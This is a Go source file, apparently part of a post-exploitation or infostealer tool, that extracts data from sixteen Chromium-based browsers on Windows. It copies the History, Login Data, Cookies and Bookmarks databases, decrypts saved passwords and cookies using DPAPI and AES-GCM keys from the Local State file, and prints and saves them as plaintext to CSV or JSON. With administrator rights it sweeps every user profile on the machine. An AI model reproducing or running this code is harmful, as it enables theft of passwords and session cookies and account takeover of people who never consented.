package browers

import (
	"encoding/base64"
	jsonpkg "encoding/json" // Renamed import
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strconv"
	"strings"
)

// 修改History函数
func History(chromePath, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "TITLE", "AccessDate"}
	data := [][]string{}

	historyTempFile, err := CreateTmpFile(chromePath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", chromePath), 1)
		return "", err
	}
	defer RemoveFile(historyTempFile)

	// 使用SQLite处理器
	sqlDatabase, err := NewSQLiteHandler(historyTempFile)
	if err != nil {
		PrintFail(fmt.Sprintf("解析SQLite文件失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	if sqlDatabase.ReadTable("urls") {
		for i := 0; i < sqlDatabase.GetRowCount(); i++ {
			url := sqlDatabase.GetValue(i, "url")
			title := sqlDatabase.GetValue(i, "title")

			lastDateStr := sqlDatabase.GetValue(i, "last_visit_time")
			lastDate, _ := strconv.ParseInt(lastDateStr, 10, 64)

			historyInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
			historyInfo += fmt.Sprintf("    [+] URL: %s\n", url)
			historyInfo += fmt.Sprintf("    [+] TITLE: %s\n", title)
			historyInfo += fmt.Sprintf("    [+] AccessDate: %s\n", TimeEpoch(lastDate).String())

			resultBuilder.WriteString(historyInfo)
			PrintNormal("    ---------------------------------------------------------")
			PrintSuccess(fmt.Sprintf("URL: %s", url), 1)
			PrintSuccess(fmt.Sprintf("TITLE: %s", title), 1)
			PrintSuccess(fmt.Sprintf("AccessDate: %s", TimeEpoch(lastDate).String()), 1)

			data = append(data, []string{url, title, TimeEpoch(lastDate).String()})
		}
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_history")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// 修改Download函数
func Download(chromePath, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "PATH", "TIME"}
	data := [][]string{}

	downloadTempFile, err := CreateTmpFile(chromePath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", chromePath), 1)
		return "", err
	}
	defer RemoveFile(downloadTempFile)

	// 使用SQLite处理器
	sqlDatabase, err := NewSQLiteHandler(downloadTempFile)
	if err != nil {
		PrintFail(fmt.Sprintf("解析SQLite文件失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	if sqlDatabase.ReadTable("downloads") {
		for i := 0; i < sqlDatabase.GetRowCount(); i++ {
			path := sqlDatabase.GetValue(i, "current_path")
			url := sqlDatabase.GetValue(i, "tab_url")

			lastDateStr := sqlDatabase.GetValue(i, "last_access_time")
			lastDate, _ := strconv.ParseInt(lastDateStr, 10, 64)

			downloadInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
			downloadInfo += fmt.Sprintf("    [+] URL: %s\n", url)
			downloadInfo += fmt.Sprintf("    [+] PATH: %s\n", path)
			downloadInfo += fmt.Sprintf("    [+] AccessDate: %s\n", TimeEpoch(lastDate).String())

			resultBuilder.WriteString(downloadInfo)
			PrintNormal("    ---------------------------------------------------------")
			PrintSuccess(fmt.Sprintf("URL: %s", url), 1)
			PrintSuccess(fmt.Sprintf("PATH: %s", path), 1)
			PrintSuccess(fmt.Sprintf("AccessDate: %s", TimeEpoch(lastDate).String()), 1)

			data = append(data, []string{url, path, TimeEpoch(lastDate).String()})
		}
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_download")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// 修改Cookies函数
func Cookies(chromeCookiePath, chromeStateFile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	cookieDataTempFile, err := CreateTmpFile(chromeCookiePath)
	if err != nil {
		PrintFail("Not Found SystemKey OR Not Administrator Privileges!", 1)
		return "", err
	}
	defer RemoveFile(cookieDataTempFile)

	stateFileContent, err := ioutil.ReadFile(chromeStateFile)
	if err != nil {
		return "", err
	}

	// 改进系统密钥获取逻辑
	// 改进系统密钥获取逻辑
	var systemKeyErr error
	if strings.Contains(string(stateFileContent), "os_crypt") {
		// 尝试多种方式获取系统密钥
		SystemKey, systemKeyErr = DecryptWithSystemDPAPI(chromeStateFile)
		if systemKeyErr != nil {
			// 尝试获取主密钥作为备选
			masterKey, masterKeyErr := GetMasterKey(chromeStateFile)
			if masterKeyErr == nil {
				SystemKey = masterKey
				systemKeyErr = nil
				PrintVerbose("使用主密钥作为系统密钥")
			} else {
				// 记录错误但继续尝试其他解密方法
				PrintVerbose(fmt.Sprintf("获取系统密钥失败: %v，尝试其他解密方法", systemKeyErr))
			}
		}
	}

	jsonHeader := []string{"domain", "expirationDate", "hostOnly", "httpOnly", "name", "path", "sameSite", "secure", "session", "storeId", "value"}
	jsonData := [][]string{}

	header := []string{"HOST", "COOKIE", "Path", "IsSecure", "Is_httponly", "HasExpire", "IsPersistent", "CreateDate", "ExpireDate", "AccessDate"}
	data := [][]string{}

	// 使用原生SQLite解析器
	sqlDatabase, err := NewSQLiteHandler(cookieDataTempFile)
	if err != nil {
		PrintFail(fmt.Sprintf("解析SQLite文件失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	if sqlDatabase.ReadTable("cookies") {
		for i := 0; i < sqlDatabase.GetRowCount(); i++ {
			creationUtc := sqlDatabase.GetValue(i, "creation_utc")
			creDate, _ := strconv.ParseInt(creationUtc, 10, 64)

			hostKey := sqlDatabase.GetValue(i, "host_key")
			name := sqlDatabase.GetValue(i, "name")
			encryptedCookie := sqlDatabase.GetValue(i, "encrypted_value")
			path := sqlDatabase.GetValue(i, "path")

			expiresUtc := sqlDatabase.GetValue(i, "expires_utc")
			expDate, _ := strconv.ParseInt(expiresUtc, 10, 64)

			lastAccessUtc := sqlDatabase.GetValue(i, "last_access_utc")
			lastDate, _ := strconv.ParseInt(lastAccessUtc, 10, 64)

			isSecure := IsTrueFalse(sqlDatabase.GetValue(i, "is_secure"))
			httpOnly := IsTrueFalse(sqlDatabase.GetValue(i, "is_httponly"))
			hasExpires := IsTrueFalse(sqlDatabase.GetValue(i, "has_expires"))
			isPersistent := IsTrueFalse(sqlDatabase.GetValue(i, "is_persistent"))
			sameSiteString := TryParseSameSite(sqlDatabase.GetValue(i, "samesite"))

			var cookieValue string

			buffer, err := base64.StdEncoding.DecodeString(encryptedCookie)
			if err != nil {
				continue
			}

			bufferString := string(buffer)
			if strings.HasPrefix(bufferString, "v20") {
				key, err := DecryptWithUserDPAPI(SystemKey, chromeStateFile)
				if err != nil {
					continue
				}

				iv := buffer[3:15]
				cipherText := buffer[15:]
				tag := cipherText[len(cipherText)-16:]
				data1 := cipherText[:len(cipherText)-16]

				aesGcm := &AesGcm{}
				decryptedData, err := aesGcm.Decrypt(key, iv, nil, data1, tag)
				if err != nil {
					continue
				}

				if len(decryptedData) > 32 {
					cookieValue = string(decryptedData[32:])
				}
			} else {
				masterKey, err := GetMasterKey(chromeStateFile)
				if err != nil {
					continue
				}

				cookieValue, err = DecryptData(buffer, masterKey)
				if err != nil {
					continue
				}
			}

			cookieInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
			cookieInfo += fmt.Sprintf("    [+] HOST: %s\n", hostKey)
			cookieInfo += fmt.Sprintf("    [+] COOKIE: %s=%s\n", name, cookieValue)
			cookieInfo += fmt.Sprintf("    [+] CreateDate: %s\n", TimeEpoch(creDate).String())
			cookieInfo += fmt.Sprintf("    [+] ExpireDate: %s\n", TimeEpoch(expDate).String())
			cookieInfo += fmt.Sprintf("    [+] AccessDate: %s\n", TimeEpoch(lastDate).String())
			cookieInfo += fmt.Sprintf("    [+] Path: %s\n", path)

			resultBuilder.WriteString(cookieInfo)
			PrintNormal("    ---------------------------------------------------------")
			PrintSuccess(fmt.Sprintf("HOST: %s", hostKey), 1)
			PrintSuccess(fmt.Sprintf("COOKIE: %s=%s", name, cookieValue), 1)
			PrintSuccess(fmt.Sprintf("CreateDate: %s", TimeEpoch(creDate).String()), 1)
			PrintSuccess(fmt.Sprintf("ExpireDate: %s", TimeEpoch(expDate).String()), 1)
			PrintSuccess(fmt.Sprintf("AccessDate: %s", TimeEpoch(lastDate).String()), 1)
			PrintSuccess(fmt.Sprintf("Path: %s", path), 1)

			cookie := fmt.Sprintf("%s=%s", name, cookieValue)

			jsonData = append(jsonData, []string{
				hostKey, strconv.FormatInt(expDate, 10), "false", httpOnly,
				name, path, sameSiteString, isSecure, "true", "0", cookieValue,
			})

			data = append(data, []string{
				hostKey, cookie, path, isSecure, httpOnly, hasExpires, isPersistent,
				TimeEpoch(creDate).String(), TimeEpoch(expDate).String(), TimeEpoch(lastDate).String(),
			})
		}
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_cookie")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(jsonHeader, jsonData, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// 修改Bookmark函数
func Bookmark(chromeBookPath string) (string, error) {
	var resultBuilder strings.Builder
	tempFile, err := CreateTmpFile(chromeBookPath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", chromeBookPath), 1)
		return "", err
	}
	defer RemoveFile(tempFile)

	bookmarkData, err := ioutil.ReadFile(tempFile)
	if err != nil {
		return "", err
	}

	// 解析书签JSON数据
	var bookmarkMap map[string]interface{}
	if err := jsonpkg.Unmarshal(bookmarkData, &bookmarkMap); err != nil {
		PrintFail(fmt.Sprintf("Failed to parse bookmark data: %v", err), 1)
		return "", err
	}

	// 提取书签数据
	header := []string{"NAME", "URL"}
	data := [][]string{}

	// 处理根节点
	if roots, ok := bookmarkMap["roots"].(map[string]interface{}); ok {
		for rootName, rootValue := range roots {
			if rootMap, ok := rootValue.(map[string]interface{}); ok {
				// 处理子节点
				traverseBookmarks(rootMap, rootName, 0, &data, &resultBuilder)
			}
		}
	}

	// 保存书签数据
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, BrowserName+"_bookmark")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	resultBuilder.WriteString("Bookmark data extracted successfully\n")
	return resultBuilder.String(), nil
}

// 修改traverseBookmarks函数
func traverseBookmarks(node map[string]interface{}, name string, depth int, data *[][]string, resultBuilder *strings.Builder) {
	indentation := strings.Repeat("  ", depth)

	// 获取节点名称
	if nodeName, ok := node["name"].(string); ok && nodeName != "" {
		name = nodeName
	}

	// 输出节点名称
	bookmarkInfo := fmt.Sprintf("%sNAME: %s\n", indentation, name)
	resultBuilder.WriteString(bookmarkInfo)
	PrintSuccess(fmt.Sprintf("%sNAME: %s", indentation, name), 1)

	// 如果是URL类型的节点，添加到数据中
	if url, ok := node["url"].(string); ok && url != "" {
		bookmarkInfo = fmt.Sprintf("%sURL: %s\n", indentation, url)
		resultBuilder.WriteString(bookmarkInfo)
		PrintSuccess(fmt.Sprintf("%sURL: %s", indentation, url), 1)
		*data = append(*data, []string{name, url})
	}

	// 处理子节点
	if children, ok := node["children"].([]interface{}); ok {
		if len(children) > 0 {
			bookmarkInfo = fmt.Sprintf("%sSubfolder:\n", indentation)
			resultBuilder.WriteString(bookmarkInfo)
			PrintSuccess(fmt.Sprintf("%sSubfolder:", indentation), 1)
			for _, child := range children {
				if childMap, ok := child.(map[string]interface{}); ok {
					traverseBookmarks(childMap, "", depth+1, data, resultBuilder)
				}
			}
		}
	}
}

// 修改Logins函数
func Logins(chromePath, chromeStateFile, browserName string) (string, error) {
	var resultBuilder strings.Builder
	header := []string{"URL", "USERNAME", "PASSWORD", "CreateDate"}
	data := [][]string{}

	loginTempFile, err := CreateTmpFile(chromePath)
	if err != nil {
		PrintFail(fmt.Sprintf("%s Not Found!", chromePath), 1)
		return "", err
	}
	defer RemoveFile(loginTempFile)

	// 尝试获取系统密钥
	stateFileContent, err := ioutil.ReadFile(chromeStateFile)
	if err != nil {
		PrintFail(fmt.Sprintf("读取状态文件失败: %v", err), 1)
		return "", err
	}

	// 改进系统密钥获取逻辑
	var systemKeyErr error
	if strings.Contains(string(stateFileContent), "os_crypt") {
		// 尝试多种方式获取系统密钥
		SystemKey, systemKeyErr = DecryptWithSystemDPAPI(chromeStateFile)
		if systemKeyErr != nil {
			// 尝试获取主密钥作为备选
			masterKey, masterKeyErr := GetMasterKey(chromeStateFile)
			if masterKeyErr == nil {
				SystemKey = masterKey
				systemKeyErr = nil
				PrintVerbose("使用主密钥作为系统密钥")
			} else {
				// 记录错误但继续尝试其他解密方法
				PrintVerbose(fmt.Sprintf("获取系统密钥失败: %v，尝试其他解密方法", systemKeyErr))
			}
		}
	}

	// 使用原生SQLite解析器
	sqlDatabase, err := NewSQLiteHandler(loginTempFile)
	if err != nil {
		PrintFail(fmt.Sprintf("解析SQLite文件失败: %v", err), 1)
		return "", err
	}
	defer sqlDatabase.Close()

	if sqlDatabase.ReadTable("logins") {
		for i := 0; i < sqlDatabase.GetRowCount(); i++ {
			url := sqlDatabase.GetValue(i, "origin_url")
			username := sqlDatabase.GetValue(i, "username_value")
			encryptedPassword := sqlDatabase.GetValue(i, "password_value")
			creationDate := sqlDatabase.GetValue(i, "date_created")
			creDate, _ := strconv.ParseInt(creationDate, 10, 64)

			var password string

			// 解密密码
			buffer, err := base64.StdEncoding.DecodeString(encryptedPassword)
			if err != nil {
				continue
			}

			bufferString := string(buffer)
			// 改进解密逻辑，增加更多错误处理和回退机制
			if len(buffer) > 3 && (strings.HasPrefix(bufferString, "v10") || strings.HasPrefix(bufferString, "v11") || strings.HasPrefix(bufferString, "v20")) {
				// 尝试使用系统密钥解密
				if SystemKey != nil {
					key, err := DecryptWithUserDPAPI(SystemKey, chromeStateFile)
					if err == nil {
						var iv, tag, data1 []byte
						if strings.HasPrefix(bufferString, "v10") || strings.HasPrefix(bufferString, "v11") {
							iv = buffer[3:15]
							if strings.HasPrefix(bufferString, "v10") {
								data1 = buffer[15:]
								tag = nil
							} else { // v11
								cipherText := buffer[15:]
								tag = cipherText[len(cipherText)-16:]
								data1 = cipherText[:len(cipherText)-16]
							}
						} else { // v20
							iv = buffer[3:15]
							cipherText := buffer[15:]
							tag = cipherText[len(cipherText)-16:]
							data1 = cipherText[:len(cipherText)-16]
						}

						aesGcm := &AesGcm{}
						decryptedData, err := aesGcm.Decrypt(key, iv, nil, data1, tag)
						if err == nil && len(decryptedData) > 0 {
							if strings.HasPrefix(bufferString, "v10") || strings.HasPrefix(bufferString, "v11") {
								password = string(decryptedData)
							} else if len(decryptedData) > 32 { // v20
								password = string(decryptedData[32:])
							}
						}
					}
				}

				// 如果上面的方法失败，尝试使用主密钥
				if password == "" {
					masterKey, err := GetMasterKey(chromeStateFile)
					if err == nil {
						password, err = DecryptData(buffer, masterKey)
					}
				}
			} else {
				decryptedData, err := decryptDPAPI(buffer)
				if err == nil && len(decryptedData) > 0 {
					password = string(decryptedData)
				} else if SystemKey != nil {
					// 如果直接解密失败，尝试使用系统密钥
					decryptedData, err := DecryptWithUserDPAPI(SystemKey, chromeStateFile)
					if err == nil && len(decryptedData) > 0 {
						password = string(decryptedData)
					}
				}
			}

			// 如果所有解密方法都失败，记录错误并继续
			//if password == "" {
			//	//PrintVerbose(fmt.Sprintf("无法解密密码: %s", url))
			//	continue
			//}

			loginInfo := fmt.Sprintf("    ---------------------------------------------------------\n")
			loginInfo += fmt.Sprintf("    [+] URL: %s\n", url)
			loginInfo += fmt.Sprintf("    [+] USERNAME: %s\n", username)
			loginInfo += fmt.Sprintf("    [+] PASSWORD: %s\n", password)
			loginInfo += fmt.Sprintf("    [+] CreateDate: %s\n", TimeEpoch(creDate).String())

			resultBuilder.WriteString(loginInfo)
			PrintNormal("    ---------------------------------------------------------")
			PrintSuccess(fmt.Sprintf("URL: %s", url), 1)
			PrintSuccess(fmt.Sprintf("USERNAME: %s", username), 1)
			PrintSuccess(fmt.Sprintf("PASSWORD: %s", password), 1)
			PrintSuccess(fmt.Sprintf("CreateDate: %s", TimeEpoch(creDate).String()), 1)

			data = append(data, []string{url, username, password, TimeEpoch(creDate).String()})
		}
	}

	// 根据格式写入文件
	if Format == "json" || Format == "csv" {
		fileName := filepath.Join(OutputDir, browserName+"_login")
		// 确保输出目录存在
		if err := os.MkdirAll(OutputDir, 0755); err != nil {
			return resultBuilder.String(), err
		}

		if Format == "json" {
			if err := WriteJSON(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		} else {
			if err := WriteCSV(header, data, fileName); err != nil {
				return resultBuilder.String(), err
			}
		}
	}

	return resultBuilder.String(), nil
}

// 修改GetChromium函数
func GetChromium(name []string) (string, error) {
	var resultBuilder strings.Builder
	BrowserName = name[0]

	if IsHighIntegrity() {
		// 高权限模式，可以访问所有用户
		userFolder := fmt.Sprintf("%s\\Users\\", os.Getenv("SystemDrive"))
		dirs, err := filepath.Glob(filepath.Join(userFolder, "*"))
		if err != nil {
			return "", err
		}

		for _, dir := range dirs {
			// 跳过系统目录
			if strings.Contains(dir, "All Users") || strings.Contains(dir, "Public") || strings.Contains(dir, "Default") {
				continue
			}

			// 获取用户名
			parts := strings.Split(dir, "\\")
			userName := parts[len(parts)-1]

			// 构建各种浏览器数据文件路径
			userChromeHistoryPath := fmt.Sprintf("%s%s\\History", dir, name[1])
			userChromeBookmarkPath := fmt.Sprintf("%s%s\\Bookmarks", dir, name[1])
			userChromeLoginDataPath := fmt.Sprintf("%s%s\\Login Data", dir, name[1])
			userChromeCookiesPath := fmt.Sprintf("%s%s\\Cookies", dir, name[1])

			// 处理路径
			var path string
			if strings.Contains(name[1], "Default") {
				path = strings.Replace(name[1], "\\Default", "", 1)
			} else {
				path = name[1]
			}

			// 获取State文件路径
			userChromeStatePath := fmt.Sprintf("%s%s\\Local State", dir, path)

			// 检查文件是否存在
			chromePaths := []string{userChromeHistoryPath, userChromeBookmarkPath, userChromeLoginDataPath, userChromeCookiesPath, userChromeStatePath}
			existingPaths := FileExists(chromePaths)

			// 只要有一个文件存在，就处理这个浏览器
			if len(existingPaths) > 0 {
				browserInfo := fmt.Sprintf("========================== %s (%s) ==========================\n", name[0], userName)
				resultBuilder.WriteString(browserInfo)
				fmt.Printf("========================== %s (%s) ==========================\n", name[0], userName)

				// 提取登录数据
				if PathExists(userChromeLoginDataPath) && PathExists(userChromeStatePath) {
					fmt.Printf("[+] Get %s Login Data", name[0])
					loginResult, _ := Logins(userChromeLoginDataPath, userChromeStatePath, name[0])
					resultBuilder.WriteString(loginResult)
				}

				// 提取书签
				if PathExists(userChromeBookmarkPath) {
					PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
					bookmarkResult, _ := Bookmark(userChromeBookmarkPath)
					resultBuilder.WriteString(bookmarkResult)

				}

				// 提取Cookie
				if PathExists(userChromeStatePath) {
					try := func() error {
						cookiePath := userChromeCookiesPath
						if !PathExists(cookiePath) {
							cookiePath = fmt.Sprintf("%s%s\\Network\\Cookies", dir, name[1])
							if !PathExists(cookiePath) {
								return fmt.Errorf("Cookie file not found")
							}
						}

						PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
						cookieResult, err := Cookies(cookiePath, userChromeStatePath, name[0])
						if err == nil {
							resultBuilder.WriteString(cookieResult)
						}
						return err
					}

					if err := try(); err != nil {
						PrintFail("Not Found SystemKey OR Not Administrator Privileges!", 1)

					}
				}

				// 提取历史记录
				if PathExists(userChromeHistoryPath) {
					PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
					historyResult, _ := History(userChromeHistoryPath, name[0])
					resultBuilder.WriteString(historyResult)
				}

				// 提取下载记录
				if PathExists(userChromeHistoryPath) {
					PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
					downloadResult, _ := Download(userChromeHistoryPath, name[0])
					resultBuilder.WriteString(downloadResult)
				}
			}
		}
	} else {
		// 普通权限模式，只能访问当前用户
		userChromeHistoryPath := fmt.Sprintf("%s%s\\History", os.Getenv("USERPROFILE"), name[1])
		userChromeBookmarkPath := fmt.Sprintf("%s%s\\Bookmarks", os.Getenv("USERPROFILE"), name[1])
		userChromeLoginDataPath := fmt.Sprintf("%s%s\\Login Data", os.Getenv("USERPROFILE"), name[1])
		userChromeCookiesPath := fmt.Sprintf("%s%s\\Cookies", os.Getenv("USERPROFILE"), name[1])

		// 处理路径
		var path string
		if strings.Contains(name[1], "Default") {
			path = strings.Replace(name[1], "\\Default", "", 1)
		} else {
			path = name[1]
		}

		userChromeStatePath := fmt.Sprintf("%s%s\\Local State", os.Getenv("USERPROFILE"), path)
		chromePaths := []string{userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath, userChromeStatePath}
		existingPaths := FileExists(chromePaths)

		// 只要有一个文件存在，就处理这个浏览器
		if len(existingPaths) > 0 {
			browserInfo := fmt.Sprintf("========================== %s (Current User) ==========================\n", name[0])
			resultBuilder.WriteString(browserInfo)
			fmt.Printf("========================== %s (Current User) ==========================\n", name[0])

			// 提取登录数据
			if PathExists(userChromeLoginDataPath) && PathExists(userChromeStatePath) {
				PrintVerbose(fmt.Sprintf("Get %s Login Data", name[0]))
				loginResult, _ := Logins(userChromeLoginDataPath, userChromeStatePath, name[0])
				resultBuilder.WriteString(loginResult)
			}

			// 提取书签
			if PathExists(userChromeBookmarkPath) {
				PrintVerbose(fmt.Sprintf("Get %s Bookmarks", name[0]))
				bookmarkResult, _ := Bookmark(userChromeBookmarkPath)
				resultBuilder.WriteString(bookmarkResult)
			}

			// 提取Cookie
			if PathExists(userChromeStatePath) {
				try := func() error {
					cookiePath := userChromeCookiesPath
					if !PathExists(cookiePath) {
						cookiePath = fmt.Sprintf("%s%s\\Network\\Cookies", os.Getenv("USERPROFILE"), name[1])
						if !PathExists(cookiePath) {
							return fmt.Errorf("Cookie file not found")
						}
					}

					PrintVerbose(fmt.Sprintf("Get %s Cookie", name[0]))
					cookieResult, err := Cookies(cookiePath, userChromeStatePath, name[0])
					if err == nil {
						resultBuilder.WriteString(cookieResult)
					}
					return err
				}

				if err := try(); err != nil {
					PrintFail("Not Found SystemKey OR Not Administrator Privileges!", 1)

				}
			}

			// 提取历史记录
			if PathExists(userChromeHistoryPath) {
				PrintVerbose(fmt.Sprintf("Get %s History", name[0]))
				historyResult, _ := History(userChromeHistoryPath, name[0])
				resultBuilder.WriteString(historyResult)
			}

			// 提取下载记录
			if PathExists(userChromeHistoryPath) {
				PrintVerbose(fmt.Sprintf("Get %s Downloads", name[0]))
				downloadResult, _ := Download(userChromeHistoryPath, name[0])
				resultBuilder.WriteString(downloadResult)
			}

		}
	}

	return resultBuilder.String(), nil
}

// ChromiumKernel 提取所有支持的Chromium内核浏览器数据
func ChromiumKernel() string {
	var resultBuilder strings.Builder
	browsers := [][]string{
		{"Chrome", "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"},
		{"Chrome Beta", "\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default"},
		{"Chromium", "\\AppData\\Local\\Chromium\\User Data\\Default"},
		{"Edge", "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default"},
		{"360 Speed", "\\AppData\\Local\\360chrome\\Chrome\\User Data\\Default"},
		{"360 Speed X", "\\AppData\\Local\\360ChromeX\\Chrome\\User Data\\Default"},
		{"Brave", "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default"},
		{"QQ", "\\AppData\\Local\\Tencent\\QQBrowser\\User Data\\Default"},
		{"Opera", "\\AppData\\Roaming\\Opera Software\\Opera Stable"},
		{"OperaGX", "\\AppData\\Roaming\\Opera Software\\Opera GX Stable"},
		{"Vivaldi", "\\AppData\\Local\\Vivaldi\\User Data\\Default"},
		{"CocCoc", "\\AppData\\Local\\CocCoc\\Browser\\User Data\\Default"},
		{"Yandex", "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default"},
		{"DCBrowser", "\\AppData\\Local\\DCBrowser\\User Data\\Default"},
		{"Old Sogou", "\\AppData\\Roaming\\SogouExplorer\\Webkit\\Default"},
		{"New Sogou", "\\AppData\\Local\\Sogou\\SogouExplorer\\User Data\\Default"},
	}

	for _, browser := range browsers {
		result, _ := GetChromium(browser)
		resultBuilder.WriteString(result)
	}

	return resultBuilder.String()
}

// SpecifyPath 从指定路径提取浏览器数据
func SpecifyPath(browserName, path string) (string, error) {
	var resultBuilder strings.Builder
	BrowserName = browserName

	userChromeHistoryPath := fmt.Sprintf("%s\\History", path)
	userChromeBookmarkPath := fmt.Sprintf("%s\\Bookmarks", path)
	userChromeLoginDataPath := fmt.Sprintf("%s\\Login Data", path)
	userChromeCookiesPath := fmt.Sprintf("%s\\Cookies", path)

	// 处理路径
	var statePath string
	if strings.Contains(path, "Default") {
		statePath = strings.Replace(path, "\\Default", "", 1)
	} else {
		statePath = path
	}

	userChromeStatePath := fmt.Sprintf("%s\\Local State", statePath)
	chromePaths := []string{userChromeHistoryPath, userChromeBookmarkPath, userChromeCookiesPath, userChromeLoginDataPath, userChromeStatePath}
	existingPaths := FileExists(chromePaths)

	// 只要有一个文件存在，就处理这个浏览器
	if len(existingPaths) > 0 {
		browserInfo := fmt.Sprintf("========================== %s (指定路径) ==========================\n", browserName)
		resultBuilder.WriteString(browserInfo)
		fmt.Printf("========================== %s (指定路径) ==========================\n", browserName)

		// 提取登录数据
		if PathExists(userChromeLoginDataPath) && PathExists(userChromeStatePath) {
			PrintVerbose(fmt.Sprintf("Get %s Login Data", browserName))
			loginResult, _ := Logins(userChromeLoginDataPath, userChromeStatePath, browserName)
			resultBuilder.WriteString(loginResult)
		}

		// 提取书签
		if PathExists(userChromeBookmarkPath) {
			PrintVerbose(fmt.Sprintf("Get %s Bookmarks", browserName))
			bookmarkResult, _ := Bookmark(userChromeBookmarkPath)
			resultBuilder.WriteString(bookmarkResult)
		}

		// 提取Cookie
		if PathExists(userChromeStatePath) {
			try := func() error {
				cookiePath := userChromeCookiesPath
				if !PathExists(cookiePath) {
					cookiePath = fmt.Sprintf("%s\\Network\\Cookies", path)
					if !PathExists(cookiePath) {
						return fmt.Errorf("Cookie file not found")
					}
				}

				PrintVerbose(fmt.Sprintf("Get %s Cookie", browserName))
				cookieResult, err := Cookies(cookiePath, userChromeStatePath, browserName)
				if err == nil {
					resultBuilder.WriteString(cookieResult)
				}
				return err
			}

			if err := try(); err != nil {
				PrintFail("Not Found SystemKey OR Not Administrator Privileges!", 1)

			}
		}

		// 提取历史记录
		if PathExists(userChromeHistoryPath) {
			PrintVerbose(fmt.Sprintf("Get %s History", browserName))
			historyResult, _ := History(userChromeHistoryPath, browserName)
			resultBuilder.WriteString(historyResult)
		}

		// 提取下载记录
		if PathExists(userChromeHistoryPath) {
			PrintVerbose(fmt.Sprintf("Get %s Downloads", browserName))
			downloadResult, _ := Download(userChromeHistoryPath, browserName)
			resultBuilder.WriteString(downloadResult)
		}

	} else {
		return "", fmt.Errorf("指定路径 %s 下未找到有效的浏览器数据文件", path)
	}

	return resultBuilder.String(), nil
}
